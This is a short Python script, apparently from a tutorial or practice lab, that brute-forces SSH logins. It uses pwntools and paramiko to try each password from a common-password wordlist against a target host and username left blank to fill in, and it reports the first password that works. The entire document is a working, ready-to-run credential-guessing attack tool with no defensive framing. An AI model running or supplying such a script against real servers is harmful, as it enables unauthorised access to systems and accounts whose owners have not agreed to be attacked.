from pwn import *
import paramiko

host = "" # SSh server IP addres
username = "" # SSH username
attempts = 0 # Counter to track the number of attempts

with open("ssh-common-passwords.txt", "r") as passwords_list:
    for password in passwords_list:
        password = password.strip("\n")
        try:
            print("[{}] Attempting password: '{}'!".format(attempts, password))
            response = ssh(host=host, user=username, password=password, timeout=1) # Uses the ssh() function from pwn to try logging in with the specified host, username, and password
            if response.connected():
                print("[>] Valid password found: '{}'!".format(password))
                response.close()
                break
            response.close()
        except paramiko.ssh_exception.AuthenticationException: # Catches the AuthenticationException thrown by paramiko when the password is incorrect
            print("[X] Invalid password!")
        attempts += 1